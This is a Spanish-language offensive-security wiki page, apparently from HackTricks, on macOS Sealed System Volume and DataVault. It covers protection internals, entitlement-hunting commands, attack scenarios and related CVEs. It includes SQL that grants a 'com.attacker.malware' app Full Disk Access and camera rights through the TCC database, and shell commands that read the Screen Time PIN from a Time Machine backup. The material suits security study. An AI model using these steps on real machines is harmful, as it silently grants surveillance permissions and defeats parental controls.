# Volumen del Sistema Sellado de macOS y DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Volumen del Sistema Sellado (SSV)

### Información básica

A partir de **macOS Big Sur (11.0)**, el volumen del sistema se sella criptográficamente mediante un **árbol hash de snapshots APFS**. Esto se denomina **Sealed System Volume (SSV)**. La partición del sistema se monta **en modo de solo lectura** y cualquier modificación rompe el sello, que se verifica durante el arranque.<sup>[[11]](#references)</sup>

El SSV proporciona:
- **Detección de manipulaciones** — cualquier modificación de los binarios o frameworks del sistema cambia la raíz del árbol de Merkle e invalida el sello firmado por Apple
- **Autenticación durante el arranque** — la cadena de arranque verifica el snapshot del sistema seleccionado antes de que se convierta en el sistema de archivos raíz
- **Resistencia a los rootkits** — ni siquiera root puede reemplazar archivos de forma persistente en el snapshot autenticado del sistema sin desactivar authenticated root o comprometer una ruta de actualización autorizada

El SSV protege el volumen **System**, no el volumen **Data** de escritura emparejado con él. Los firmlinks combinan ambos volúmenes en el espacio de nombres visible en `/`, por lo que una ruta que parece permitir escritura no demuestra que el objeto subyacente pertenezca al snapshot sellado. FileVault y Data Protection protegen la confidencialidad de los datos en reposo; son independientes de la integridad del SSV.<sup>[[11]](#references)</sup>

### Comprobar el estado del SSV

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Vista efectiva del sistema: SSV + grafts de Cryptex

En las versiones recientes de macOS, no todos los ejecutables visibles bajo `/System` provienen necesariamente de la instantánea SSV de arranque. **Cryptexes** son imágenes de disco APFS autenticadas por separado, cuyo contenido se injerta sobre directorios seleccionados; por lo tanto, las Respuestas rápidas de seguridad pueden reemplazar componentes sensibles para la seguridad sin reconstruir el SSV base. Al investigar persistencia o comparar diferencias en el código del sistema, inventaría los montajes activos y el almacén de Cryptex de Preboot, en lugar de calcular hashes únicamente de la instantánea base:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

La cadena de arranque y los detalles de Rapid Security Response se describen en [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses); esta sección se centra en el límite del SSV.

### Entitlements de escritura del SSV

Ciertos binarios del sistema de Apple tienen entitlements que les permiten modificar o administrar el volumen de sistema sellado:

| Entitlement | Propósito |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Revertir el volumen del sistema a una snapshot anterior |
| `com.apple.private.apfs.create-sealed-snapshot` | Crear una nueva snapshot sellada después de las actualizaciones del sistema |
| `com.apple.rootless.install.heritable` | Escribir en rutas protegidas por SIP (heredado por los procesos secundarios) |
| `com.apple.rootless.install` | Escribir en rutas protegidas por SIP |

### Encontrar escritores del SSV

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Escenarios de ataque

#### Ataque de reversión de instantánea

Si un atacante compromete un binario con `com.apple.private.apfs.revert-to-snapshot`, puede **revertir el volumen del sistema a un estado anterior a la actualización** y restaurar vulnerabilidades conocidas:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> La reversión de una snapshot **deshace las actualizaciones de seguridad**, restaurando vulnerabilidades del kernel y del sistema que ya se habían corregido. Es una de las operaciones más peligrosas que se pueden realizar en macOS moderno.

#### Reemplazo de binarios del sistema

Con un bypass de SIP + capacidad de escritura en SSV, un atacante puede:

1. Montar el volumen del sistema con permisos de lectura y escritura
2. Reemplazar un daemon del sistema o una biblioteca de framework por una versión troyanizada
3. Volver a sellar la snapshot (o aceptar que el sello esté roto si SIP ya está degradado)
4. El rootkit persiste tras los reinicios y es invisible para las herramientas de detección en userland

### CVE del mundo real

| CVE | Descripción |
|---|---|
| CVE-2021-30892 | **Shrootless** — bypass de SIP que aprovecha el entitlement `com.apple.rootless.install.heritable` de `system_installd` para ejecutar scripts arbitrarios posteriores a la instalación ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | Bypass de SIP: `system_installd` preparaba el script posterior a la instalación en una carpeta protegida por SIP dentro de `/tmp`, pero `/tmp` en sí no está protegido por SIP, así que la carpeta podía sustituirse montando una imagen sobre ella ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — condición de carrera de copy-on-write en XNU que permite escribir en archivos de solo lectura propiedad de root ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Información básica

**DataVault** es una protección del sistema de archivos, controlada por entitlement, para archivos y directorios sensibles. El flag BSD `UF_DATAVAULT` (`0x00000080`) marca un objeto como sujeto a un entitlement para permitir tanto la lectura como la escritura; a diferencia del DAC normal, convertirse simplemente en **root** u obtener Full Disk Access no satisface esa comprobación mientras la protección esté activa.<sup>[[4]](#references)[[13]](#references)</sup>

No uses “DataVault” como sinónimo de todas las bases de datos protegidas. Las bases de datos de TCC se rigen por las políticas específicas de TCC/FDA y SIP (consulta [macOS TCC](macos-tcc/README.md)), mientras que el acceso a los elementos del keychain también depende de las ACL del Keychain y de la protección criptográfica (consulta [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Los ejemplos reales de DataVault suelen encontrarse en almacenes propiedad de servicios bajo `/private/var/folders/.../0/`, como el almacén de Screen Time; el flag aparece como `datavault` en los flags de archivo BSD cuando se puede ejecutar `stat` sobre el directorio padre.

### Entitlements de controladores de DataVault

| Entitlement | Límite de seguridad |
|---|---|
| `com.apple.rootless.datavault.controller` | Acceder a objetos `UF_DATAVAULT` y gestionarlos<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Gestionar decisiones de TCC; es un límite de privacidad relacionado, pero independiente |
| `com.apple.private.tcc.allow` | Omitir servicios de TCC seleccionados, especificados en el valor del entitlement |
| `com.apple.rootless.storage.TCC` | Escribir en el almacén de TCC protegido por SIP |

Un proceso que combine un entitlement de controlador de DataVault con funcionalidad de FDA, backup, indexación o IPC resulta especialmente interesante: busca una primitiva de *confused deputy* que copie un objeto protegido a una ruta ordinaria, en lugar de intentar abrir directamente el vault.<sup>[[14]](#references)</sup>

### Cómo encontrar controladores de DataVault

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Escenarios de ataque

#### Modificación directa de la base de datos TCC (límite TCC separado)

Si un atacante compromete un proceso administrador de TCC (p. ej., mediante code injection en uno que tenga `com.apple.private.tcc.manager`), puede **modificar directamente la base de datos TCC** para otorgar cualquier permiso TCC a cualquier aplicación:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> La modificación de la base de datos de TCC es el **bypass definitivo de la privacidad**: concede cualquier permiso en silencio, sin mostrar avisos al usuario ni indicadores visibles. Históricamente, varias cadenas de escalada de privilegios de macOS han terminado con escrituras en la base de datos de TCC como payload final.

#### Acceso a la base de datos de Keychain

El acceso directo a una base de datos subyacente de Keychain no equivale a acceder a secretos en texto plano. Si otro límite de privilegios permite que un atacante copie la base de datos, todavía es necesario atacar el material criptográfico y las ACL de los elementos; consulta la página dedicada a [macOS Keychain](../../macos-red-teaming/macos-keychain.md) en lugar de asumir que basta con un entitlement de controlador de DataVault.

#### Límite de la copia de seguridad: Time Machine

Un análisis de 2026 demostró un patrón general útil: `backupd` cuenta tanto con `com.apple.rootless.datavault.controller` como con Acceso total al disco para poder copiar almacenes protegidos. En la configuración probada, `/private/var/folders` estaba incluido en Time Machine y la copia de seguridad montada no aplicaba el límite activo de DataVault. El investigador usó esto para localizar el almacén SQLite de Screen Time y leer el PIN de restricciones en texto plano sin abrir el vault activo. Considéralo un **ataque al límite de la copia**: enumera los procesos auxiliares de backup, exportación, migración, indexación y diagnóstico que puedan materializar datos del vault en un punto de montaje o una ruta con menos restricciones.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

Este comportamiento depende de la versión y de la estructura de la copia de seguridad. Valídalo en la build de destino y recuerda que un destino de Time Machine cifrado solo protege la copia mientras está bloqueado; una vez montado, sus controles de acceso pasan a formar parte de la superficie de ataque.

### CVE del mundo real relacionados con DataVault y el bypass de TCC

| CVE | Descripción |
|---|---|
| CVE-2024-44131 | Una race condition con symlinks de FileProvider permite que un helper con privilegios acceda a datos protegidos por TCC ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | Como root, **crear un usuario nuevo cuyo `NFSHomeDirectory` apunte a un `TCC.db` controlado por el atacante**; al iniciar sesión, `tccd` lo consume y se aplican los permisos concedidos, lo que permite acceder a los datos de otros usuarios ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | «powerdir»: cambiar el directorio home del usuario para colocar un TCC.db controlado por el atacante ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Un fallo en la conclusión del bundle permite que una app **herede los permisos de TCC de un bundle donante** sin mostrar un aviso; **XCSSET** lo explotó activamente para capturar la pantalla del escritorio ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` construía la ruta de la DB a partir de `$HOME`, por lo que `launchctl setenv HOME` la redirigía a un `TCC.db` controlado por el atacante ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` tenía `com.apple.private.tcc.manager` **y** la validación de bibliotecas deshabilitada, por lo que un plug-in HAL colocado en `/Library/Audio/Plug-Ins/HAL` podía conceder derechos de TCC arbitrarios ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft descubre una nueva vulnerabilidad de macOS, Shrootless, que podría eludir System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Análisis técnico: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Vale la pena hacerlo mal](https://worthdoingbadly.com/macdirtycow/)
- [4] [Seguridad de las plataformas Apple — Protección de datos](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: el bypass de TCC roba datos de iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Descubriendo malware de macOS: bypass de TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [Una nueva vulnerabilidad de macOS, «powerdir», podría permitir el acceso no autorizado a los datos de los usuarios](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Se descubre un bypass de TCC de día cero en el malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: elusión del framework Transparency, Consent, and Control (TCC) de macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Reproduce música y elude TCC, también conocido como CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [La pesadilla de las actualizaciones OTA de Apple (snapshots de APFS)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — Explotación de TCC](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [Cómo eludir tu propio código de Screen Time — análisis del código fuente y de Time Machine/DataVault](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
